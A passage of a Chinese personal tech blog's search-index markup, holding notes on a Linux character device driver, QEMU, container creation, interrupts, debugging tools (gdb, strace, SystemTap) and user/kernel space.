    cdev_add(gDev, devNum, 1); // 建立设备号和dev结构体联系
    return 0;
}

void __exit hello_exit(void)
{
  printk(KERN_INFO &amp;quot; hello driver exit \n&amp;quot;);
    cdev_del(gDev);
    kfree(gFile);
    kfree(gDev);
    unregister_chrdev_region(devNum, subDevNum);
    return;
}

module_init(hello_init); // 驱动程序的入口函数，相当于main函数，当insmod就会调用hello_init函数
module_exit(hello_exit); // 当rmmod时，调用hello_exit
MODULE_LICENSE(&amp;quot;GPL&amp;quot;); 
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;makefile&#34;&gt;Makefile&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-makefile&#34;&gt;ifneq ($(KERNELRELEASE),)
    obj-m := helloDev.o
else
PWD := $(shell pwd)
KDIR := /lib/modules/4.4.0-31-generic/build # 内核头文件的目录，如果没有这个目录，需要安装内核开发包
#KDIR := /lib/modules/`uname -r`/build
all:
    make -C $(KDIR) M=$(PWD)
clean:
    rm -rf *.o *.ko *.mod.c *.symvers *.c~ *~
endif
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;编译加载驱动&#34;&gt;编译加载驱动&lt;/h3&gt;
&lt;p&gt;dmesg -c&lt;br&gt;
insmod helloDev.ko&lt;br&gt;
dmesg&lt;/p&gt;
&lt;h3 id=&#34;测试驱动&#34;&gt;测试驱动&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/select.h&amp;gt;

#define DATA_NUM    (64)
int main(int argc, char *argv[])
{
   int fd, i;
   int r_len, w_len;
   fd_set fdset;
   char buf[DATA_NUM]=&amp;quot;hello world&amp;quot;;
   memset(buf,0,DATA_NUM);
   fd = open(&amp;quot;/dev/hello&amp;quot;, O_RDWR);
printf(&amp;quot;%d\r\n&amp;quot;,fd);
   if(-1 == fd) {
      perror(&amp;quot;open file error\r\n&amp;quot;);
return -1;
   }
else {
printf(&amp;quot;open successe\r\n&amp;quot;);
}
   
   w_len = write(fd,buf, DATA_NUM);
   r_len = read(fd, buf, DATA_NUM);
   printf(&amp;quot;%d %d\r\n&amp;quot;, w_len, r_len);
   printf(&amp;quot;%s\r\n&amp;quot;,buf);

   return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在运行测试程序之前，先手动在/dev创建设备文件：&lt;/p&gt;
&lt;p&gt;mknod /dev/hello c 232 0&lt;/p&gt;
&lt;p&gt;c：字符设备&lt;br&gt;
232：主设备号&lt;br&gt;
0：次设备号&lt;/p&gt;
&lt;p&gt;然后可以运行测试程序进行测试。&lt;/p&gt;
">【linux】字符设备驱动</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/xu-ni-hua-qemu/"" data-c="
          &lt;h2 id=&#34;qemu&#34;&gt;qemu&lt;/h2&gt;
&lt;p&gt;qemu本身并不是KVM的一部分，就是一个著名的开源虚拟机软件。&lt;/p&gt;
&lt;p&gt;qemu是通过纯软件来仿真x86平台处理器的取指、解码和执行，指令并不会在物理平台上直接执行，因此性能比较差，但可以模拟不同架构平台的虚拟机。&lt;/p&gt;
&lt;h3 id=&#34;qemu的使用&#34;&gt;qemu的使用&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 安装
apt install qemu-system-x86

# 创建硬盘
qemu-img create disk.img 20G

# 分配物理光驱
qemu-system-x86_64 disk.img -cdrom ***.iso

# 配置CPU
-smp n[,maxcpus=cpus][,cores=cores][,threads=threads][,sockets=sockets]
# n 用于设置客户机中使用的逻辑CPU数量，默认=1；
# maxcpus 用于设置客户机中最大可能被使用的CPU数量，包括热插拔hot-plug加入CPU
# cores 用于设置每个CPU socket上的cores数量，默认=1
# threads用于设置每个CPUcore上的线程数，默认=1
# sockets用于设置客户机中看到的总的CPU socket数量
#  通过-cpu ?参数设定虚拟机中使用的处理器型号
# 例如 qemu-system-x86_64 -smp 2,sockets=2,cores=2,threads=2 -cpu core2duo ...

# 配置内存
qemu -m 1024
qemu -m 2G
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;网络配置&#34;&gt;网络配置&lt;/h3&gt;
&lt;p&gt;网络配置较为复杂&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-net nic[,vlan=n][,macaddr=mac][,model=type][,name=str][,addr=str][,vectors=v]
-net user[,vlan=n][,name=str][,net=addr[/mask]][,host=addr][,restrict=on|off]
         [,hostname=host][,dhcpstart=addr][,dns=addr][,dnssearch=domain][,tftp=dir]
         [,bootfile=f][,hostfwd=rule][,guestfwd=rule][,smb=dir[,smbserver=addr]]
-net tap[,vlan=n][,name=str][,fd=h][,fds=x:y:...:z][,ifname=name][,script=file][,downscript=dfile][,helper=helper][,sndbuf=nbytes][,vnet_hdr=on|off][,vhost=on|off][,vhostfd=h][,vhostfds=x:y:...:z][,vhostforce=on|off][,queues=n]
-net bridge[,vlan=n][,name=str][,br=bridge][,helper=helper]
//......
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;与其他虚拟机类似，支持4种网卡类型：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;桥接&lt;br&gt;
基于网桥的虚拟网卡，在主机的网卡上建立一个虚拟网桥，然后再虚拟网桥上创建虚拟的网卡，把创建好的虚拟网卡分配给qemu客户机使用。&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# apt-get install bridge-utils
# brctl addbr br0    # 添加bridge br0
# brctl addif br0 eth0 # 将br0 与eth0 绑定
# brctl stp br0 on    # 将br0设置为STP协议
# ifconfig eth0 0     # 将eth0 的IP设置为0，因为eth0已经工作在链路层，不需要IP
# dhclient br0       # 设置br0参数
# route            # 查看路由表

# 然后将虚拟机网卡tap分配给客户机
qemu-system-x86_64 -hda disk.img -m 2G -net nic -net tap,ifname=tap1,script=/etc/qemu-ifup,downscript=no
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果客户机网卡设置成dhcp模式的，会发现客户机的IP地址与主机的IP地址在同一个网段上。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;NAT&lt;/li&gt;
&lt;li&gt;内部网络&lt;/li&gt;
&lt;li&gt;直接分配宿主机的物理网卡&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;qemu参数&#34;&gt;qemu参数&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-M vexpress-a9&lt;/td&gt;
&lt;td&gt;指定要仿真的开发板：vexpress-a9&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-m 512M&lt;/td&gt;
&lt;td&gt;指定DRAM内存大小为512MB&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-cpu cortex-a9&lt;/td&gt;
&lt;td&gt;指定CPU架构&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-smp n&lt;/td&gt;
&lt;td&gt;CPU的个数，不设置的话，默认是1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-kernel ./zImage&lt;/td&gt;
&lt;td&gt;要运行的内核镜像&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-dtb ./vexpress-vap-ca9.dtb&lt;/td&gt;
&lt;td&gt;要加载的设备树文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-append cmdline&lt;/td&gt;
&lt;td&gt;设置Linux内核命令行、启动参数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-initrd file&lt;/td&gt;
&lt;td&gt;使用file文件作为初始化ram disk&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-nographic&lt;/td&gt;
&lt;td&gt;非图形化启动，使用串口作为控制台&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-sd rootfs.ext3&lt;/td&gt;
&lt;td&gt;使用rootfs.ext3作为SD卡镜像文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-net nic&lt;/td&gt;
&lt;td&gt;创建一个网卡&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-net nic -net tap&lt;/td&gt;
&lt;td&gt;将开发板网卡和主机网卡建立桥接(Bridge)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;re&#34;&gt;re&lt;/h3&gt;
&lt;p&gt;https://www.zhaixue.cc/qemu/qemu-intro.html&lt;/p&gt;
">【虚拟化】qemu</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/rong-qi-01-rong-qi-de-chuang-jian-yuan-li/"" data-c="
          &lt;p&gt;容器=cgroup(资源控制)+namespace(访问隔离)+rootfs(文件系统隔离)+容器引擎(生命周期控制)&lt;/p&gt;
&lt;h2 id=&#34;容器的创建原理&#34;&gt;容器的创建原理&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;创建进程&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;pid = clone(fun, stack, flags, clone_arg);
(flags: CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWPIC | CLONE_NEWUTS | ...)
&lt;/code&gt;&lt;/pre&gt;
通过clone系统调用，并传入各个namespace对应的clone flag，创建了一个新的子进程，该进程用用自己的pid、mount、user、net、ipc、uts namespace。&lt;/li&gt;
&lt;li&gt;设定cgroup&lt;br&gt;
简单的说，创建一个新的cgroup就是在cgroupfs的挂载目录中创建一个新的文件夹，因为cgroup分了不同的subsystem，挂载在不同的目录下，所以在每个目录下都创建一个新的文件夹，将进程的pid写进去。&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo &amp;amp;pid &amp;gt; /sys/fs/cgroup/cpu/tasks
echo &amp;amp;pid &amp;gt; /sys/fs/cgroup/cpuset/tasks
echo &amp;amp;pid &amp;gt; /sys/fs/cgroup/blkio/tasks
echo &amp;amp;pid &amp;gt; /sys/fs/cgroup/memory/tasks
echo &amp;amp;pid &amp;gt; /sys/fs/cgroup/devices/tasks
echo &amp;amp;pid &amp;gt; /sys/fs/cgroup/freezer/tasks
&lt;/code&gt;&lt;/pre&gt;
将进程pid写入各个cgroup子系统中。&lt;/li&gt;
&lt;li&gt;创建文件系统&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;fun()
{
    ...
    pivot_root(&amp;quot;path_of_rootfs/&amp;quot;, path);
    ...
    exec(&amp;quot;bin/bash&amp;quot;);
    ...
}
&lt;/code&gt;&lt;/pre&gt;
该fun函数由上面生成的新进程执行，在fun函数中，通过pivot_root系统调用，使进程进入一个新的rootfs，之后通过进入一个新的rootfs，之后通过exec系统调用，在新的namespace、cgroup、rootfs中执行&amp;quot;/bin/bash&amp;quot;程序。&lt;/li&gt;
&lt;/ol&gt;
">【容器】容器的创建原理</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-zhong-duan-guan-li/"" data-c="
          &lt;h2 id=&#34;中断管理机制&#34;&gt;中断管理机制&lt;/h2&gt;
&lt;h2 id=&#34;硬件中断号和linux中断号的映射&#34;&gt;硬件中断号和linux中断号的映射&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;虚拟中断号&lt;br&gt;
也称为软件中断号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;硬件中断号&lt;br&gt;
一般指的是硬件接口的编号所对应的中断号。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;软件中断号和硬件中断号有一个映射关系。&lt;/p&gt;
&lt;h2 id=&#34;注册中断&#34;&gt;注册中断&lt;/h2&gt;
&lt;p&gt;当一个外设中断发生后，&lt;/p&gt;
">【linux】中断管理</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-strace-xi-tong-diao-yong-gen-zong-gong-ju/"" data-c="
          &lt;h3 id=&#34;gdb&#34;&gt;gdb&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;简述&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;gdb是gcc的调试工具，它主要由c和c++编写的应用程序&lt;/li&gt;
&lt;li&gt;功能十分强大
&lt;ul&gt;
&lt;li&gt;启动程序，可按用户自定义要求随心所欲运行程序&lt;/li&gt;
&lt;li&gt;可以让被调试的程序在指定端点停住&lt;/li&gt;
&lt;li&gt;当程序被停住时，可以检查此时程序中运行状态&lt;/li&gt;
&lt;li&gt;动态的改变程序的运行环境&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;要调试C/C++程序，需要在编译时将调试信息加入到可执行文件中，使用编译器的-g参数可完成&lt;/li&gt;
&lt;li&gt;启动gdb的方法
&lt;ul&gt;
&lt;li&gt;gdb program
&lt;ul&gt;
&lt;li&gt;program是执行文件，一般在当前目录下&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;gdb program core
&lt;ul&gt;
&lt;li&gt;用gdb同时调试一个运行程序和core文件，core是程序非法执行后core dump后产生的文件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;gdb program 1234
&lt;ul&gt;
&lt;li&gt;如果程序是一个服务程序，那么可以指定这个服务程序运行时的进程ID，gdb会自动进行attach操作，并调试这个程序&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;常见用法&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;示例代码&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;//test.cpp
#include&amp;lt;iostream&amp;gt;
using namespace std;
 
int fun(int n)
{
    int res = 0;
    for(int i=1;i&amp;lt;=n;i++)
        res+=i;
    return res;
}
 
int main()
{
    int arr[10];
    arr[0]=0;
    arr[1]=1;
    for(int i=2;i&amp;lt;10;i++)
    {
        arr[i]=arr[i-1]+arr[i-2];
    }
    cout&amp;lt;&amp;lt;&amp;quot;arr[9]&amp;quot;&amp;lt;&amp;lt;arr[9]&amp;lt;&amp;lt;endl;
    cout&amp;lt;&amp;lt;&amp;quot;fun(9)&amp;quot;&amp;lt;&amp;lt;fun(9)&amp;lt;&amp;lt;endl;
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;使用如下命令进行编译程序&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;g++ -g -o test test.cpp
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;使用gdb调试程序&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb test
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;参数使用帮助
&lt;ul&gt;
&lt;li&gt;l，列出函数代码及其行数&lt;/li&gt;
&lt;li&gt;b 16，在代码16处设置断点&lt;/li&gt;
&lt;li&gt;b fun，在函数fun处设置断点&lt;/li&gt;
&lt;li&gt;info break，查看断点信息&lt;/li&gt;
&lt;li&gt;r，运行程序&lt;/li&gt;
&lt;li&gt;n，单条执行语句&lt;/li&gt;
&lt;li&gt;p i，打印i变量的值&lt;/li&gt;
&lt;li&gt;bt，查看函数的堆栈&lt;/li&gt;
&lt;li&gt;finish，退出函数&lt;/li&gt;
&lt;li&gt;q，结束调试&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627828521264.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;使用gdb分析coredump文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;core又称为coredump文件，是Unix/Linux操作系统的一种机制，对于线上服务来说，出core的过程意味着服务暂时不能响应，需要恢复，并且随着Core进程的内存空间越大，此过程可能持续很长一段时间&lt;/li&gt;
&lt;li&gt;凡事皆有两面性，操作系统在coredump时，虽然会终止当前进程，但是也会保留下第一手的现场数据，操作系统仿佛是一架按下快门的相机，照片就是生成的coredump&lt;/li&gt;
&lt;li&gt;coredump文件包含当进程被终止时内存、CPU寄存器和各种函数调用堆栈信息等，以供后序开发人员调试&lt;/li&gt;
&lt;li&gt;coredump存储路径
&lt;ul&gt;
&lt;li&gt;执行命令可以看到core文件存在位置&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;coredump产生条件&lt;/li&gt;
&lt;li&gt;coredump产生原因&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;gdb定位coredump文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;示例代码&lt;/li&gt;
&lt;li&gt;使用命令编译代码并执行&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;strace&#34;&gt;strace&lt;/h3&gt;
&lt;p&gt;strace是一种调试工具，可以用来跟踪程序系统调用，在Ubuntu下可以通过命令apt install strace安装&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;也可以用来跟踪信号调用，且可统计系统调用。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;实例程序：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include&amp;lt;iostream&amp;gt;
using namespace std;
int main()
{
    cout&amp;lt;&amp;lt;&amp;quot;Hello World!&amp;quot;&amp;lt;&amp;lt;endl;
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用如下命令追踪系统调用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;g++ test.cpp -o teststrace ./test
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果图&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627828827577.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627829057506.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;结果分析&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每一行都是一次系统调用，等号左边是系统调用的函数名和参数，右边是该调用的返回值&lt;/li&gt;
&lt;li&gt;从上面结果图，系统首先调用execve，创建一个新的进程，接着是一些环境初始化，然后在最后倒数第4行，调用write函数将字符串输出到屏幕，最后调用exit_group退出进程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;使用strace做信号追踪&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;strace在运行程序时，如果程序被传递了任何信号是可以监视到的&lt;/li&gt;
&lt;li&gt;统计系统调用
&lt;ul&gt;
&lt;li&gt;通过使用 -c 参数，可以将进程的所有系统调用做一个统计分析并显示&lt;br&gt;
&lt;img src=&#34;https://cactusii.github.io//post-images/1627828952384.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;systemtap&#34;&gt;SystemTap&lt;/h3&gt;
&lt;p&gt;SystemTap基于kprobe的实现，可监控内核和用户程序。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;监控运行中程序指定函数的调用参数值。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;pthread.h&amp;gt;

void print(char *p){
    printf(&amp;quot;%s.\n&amp;quot;, p);
}

void* test_fn(void* arg){
    while(1){
        print(&amp;quot;hello&amp;quot;);
        sleep(5);
    }
    return ((void *)0);
}

int main(int argc, char **argv){
    pthread+t id;
    int ret;
    ret = pthread_create(&amp;amp;id, NULL, test_fn, NULL);
    if(ret != 0){
        printf(&amp;quot;create! \n&amp;quot;);
        exit(1);
    }
    printf(&amp;quot;int main process.\n&amp;quot;);
    pthread_join(id, NULL);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以上程序没5秒会调用一次print，我想知道print的输入参数是什么，那么编写SystemTap脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;function myprint: string (val)
%{
    char *str = (char *) STAP_ARG_val;
    snprintf(STAP_RETVALUE, MAXSTRINGLEN, &amp;quot;%s&amp;quot;, str);
%}
probe process(3266).function(&amp;quot;print&amp;quot;) {printf(&amp;quot;%s\n&amp;quot;, myprint($p));}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;stap -g test.stp&lt;/p&gt;
&lt;p&gt;这样就可以获得监控的结果了，因为用到了内嵌C来获取字符串的值，所以就需要加上-g参数。&lt;/p&gt;
&lt;h3 id=&#34;dtrace&#34;&gt;DTrace&lt;/h3&gt;
&lt;p&gt;Dtrace可以监控用户态的程序。&lt;/p&gt;
">【linux】几种进程监控工具</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-jin-cheng-zhong-duan-shang-xia-wen/"" data-c="
          &lt;h2 id=&#34;内核空间和用户空间&#34;&gt;内核空间和用户空间&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1630477308043.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;用户态和内核态&#34;&gt;用户态和内核态&lt;/h3&gt;
&lt;p&gt;当进程在执行用户&lt;strong&gt;自己的代码&lt;/strong&gt;时，则称其处于用户运行态，即此时处理器在特权级最低的（3级）用户代码中运行。当一个进程执行系统调用而陷入内核态执行时，就称为进程处于内核态，此时处理器处于特权级较高的(0级)内核代码中执行。&lt;/p&gt;
&lt;p&gt;当正在执行用户程序而突然被中断程序中断时，此时用户程序也可以象征性地称为处于进程的内核态。因为中断处理程序将使用当前进程的内核栈。这与处于内核态的进程的状态有些类似。&lt;/p&gt;
&lt;h3 id=&#34;用户栈和内核栈&#34;&gt;用户栈和内核栈&lt;/h3&gt;
&lt;p&gt;在一个进程被创建时，会创建进程控制块和进程堆栈，&lt;strong&gt;每个进程都有自己的用户栈和内核栈&lt;/strong&gt;。用户栈保存在用户地址空间，内核栈保存在内核地址空间。&lt;/p&gt;
&lt;p&gt;CPU堆栈指针寄存器，进程在用户态时，指向用户堆栈地址；进程在内核态时，指向内核堆栈地址。即：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1630482357569.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;当从用户栈切换到内核栈时，需要经历两个步骤，首先是将用户堆栈地址保存到内核堆栈中，然后将CPU堆栈寄存器指向内核堆栈；当从内核栈切换到用户栈时，需要将内核堆栈中保存的用户堆栈地址恢复到CPU堆栈寄存器中。&lt;/p&gt;
&lt;p&gt;那么，知道从内核转到用户态时，用户栈的地址是在陷入内核的时候保存在内核栈里面的，但是在陷入内核的时候，如何知道内核栈的地址？关键在进程从用户态转到内核态的时候，进程的内核栈总是空的。这是因为当进程在用户态运行时，使用的用户栈，当进程陷入到内核态时，内核保存进程在内核态运行的相关信息，但是一旦进程返回到用户态后，内核栈中保存的信息无效，会全部恢复，因此每次进程从用户态陷入内核的时候得到的内核栈都是空的。所以在进程陷入内核的时候，直接把内核栈的栈顶地址给堆栈指针寄存器就可以了&lt;/p&gt;
&lt;p&gt;简而言之,一个程序至少有一个进程,一个进程至少有一个线程. 线程的划分尺度小于进程，使得多线程程序的并发性高。&lt;br&gt;
另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。&lt;br&gt;
同一个进程的多个子线程在进程的共享内存中分配独立的栈空间&lt;br&gt;
栈：是个线程独有的，保存其运行状态和局部自动变量的。栈在线程开始的时候初始化，每个线程的栈互相独立，因此，栈是thread safe的。每个C++对象的数据成员也存在在栈中，每个函数都有自己的栈，栈被用来在函数之间传递参数。操作系统在切换线程的时候会自动的切换栈，就是切换SS/ESP寄存器。栈空间不需要在高级语言里面显式的分配和释放。&lt;br&gt;
在Linux系统上每一个线程，实际上都有独立的2个栈空间，用户栈空间和内核栈空间。（注意是每个线程）&lt;br&gt;
进程和线程在Linux上的唯一区别就是同一个进程的不同线程共享进程的地址空间，仅此而已。&lt;/p&gt;
&lt;h2 id=&#34;进程中断上下文&#34;&gt;进程/中断上下文&lt;/h2&gt;
&lt;h3 id=&#34;进程上下文&#34;&gt;进程上下文&lt;/h3&gt;
&lt;p&gt;当一个进程在执行时，&lt;strong&gt;CPU的所有寄存器中的值、进程的状态以及堆栈中的内容被称为该进程的上下文&lt;/strong&gt;。当内核需要切换到另一个进程时，它需要保存当前进程的所有状态，即保存当前进程的上下文，以便在再次执行该进程时，能够必得到切换时的状态执行下去。在LINUX中，当前进程上下文均保存在进程的任务数据结构中。&lt;/p&gt;
&lt;h3 id=&#34;中断上下文&#34;&gt;中断上下文&lt;/h3&gt;
&lt;p&gt;在发生中断时,内核就在被中断进程的上下文中，在内核态下执行中断服务例程。但同时会保留所有需要用到的资源，以便中断服务结束时能恢复被中断进程的执行。&lt;/p&gt;
&lt;h3 id=&#34;上下文切换&#34;&gt;上下文切换&lt;/h3&gt;
&lt;p&gt;正是有了不同运行状态的划分，才有了上下文的概念。用户空间的应用程序，如果想要请求系统服务，比如操作一个物理设备，或者映射一段设备空间的地址到用户空间，就必须通过系统调用来（操作系统提供给用户空间的接口函数）实现。如下图所示：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627826877794.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;通过系统调用，用户空间的应用程序就会进入内核空间，由内核代表该进程运行于内核空间，这就涉及到上下文的切换，用户空间和内核空间具有不同的地址映射，通用或专用的寄存器组，而用户空间的进程要传递很多变量、参数给内核，内核也要保存用户进程的一些寄存器、变量等，以便系统调用结束后回到用户空间继续执行，所谓的进程上下文，就是一个进程在执行的时候，CPU的所有寄存器中的值、进程的状态以及堆栈中的内容，当内核需要切换到另一个进程时，它需要保存当前进程的所有状态，即保存当前进程的进程上下文，以便再次执行该进程时，能够恢复切换时的状态，继续执行。&lt;/p&gt;
&lt;p&gt;同理，硬件通过触发信号，导致内核调用中断处理程序，进入内核空间。这个过程中，硬件的一些变量和参数也要传递给内核，内核通过这些参数进行中断处理，中断上下文就可以理解为硬件传递过来的这些参数和内核需要保存的一些环境，主要是被中断的进程的环境。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Linux内核工作在进程上下文或者中断上下文。&lt;/strong&gt; 提供系统调用服务的内核代码代表发起系统调用的应用程序运行在进程上下文；另一方面，中断处理程序，异步运行在中断上下文。中断上下文和特定进程无关。&lt;/p&gt;
&lt;p&gt;运行在进程上下文的内核代码是可以被抢占的（Linux2.6支持抢占）。但是一个中断上下文，通常都会始终占有CPU（当然中断可以嵌套，但我们一般不这样做），不可以被打断。正因为如此，运行在中断上下文的代码就要受一些限制，不能做下面的事情：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;睡眠或者放弃CPU。  这样做的后果是灾难性的，因为内核在进入中断之前会关闭进程调度，一旦睡眠或者放弃CPU，这时内核无法调度别的进程来执行，系统就会死掉&lt;/li&gt;
&lt;li&gt;尝试获得信号量 如果获得不到信号量，代码就会睡眠，会产生和上面相同的情况&lt;/li&gt;
&lt;li&gt;执行耗时的任务 中断处理应该尽可能快，因为内核要响应大量服务和请求，中断上下文占用CPU时间太长会严重影响系统功能。&lt;/li&gt;
&lt;li&gt;访问用户空间的虚拟地址 因为中断上下文是和特定进程无关的，它是内核代表硬件运行在内核空间，所以在中端上下文无法访问用户空间的虚拟地址。&lt;/li&gt;
&lt;/ol&gt;
">【linux】用户/内核空间、用户/内核态、用户栈/内核栈、进程/中断上下文</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-geng-huan-nei-he-ban-ben/"" data-c="
          &lt;h3 id=&#34;编译内核安装内核&#34;&gt;编译内核(安装内核)&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;1. 下载内核源码
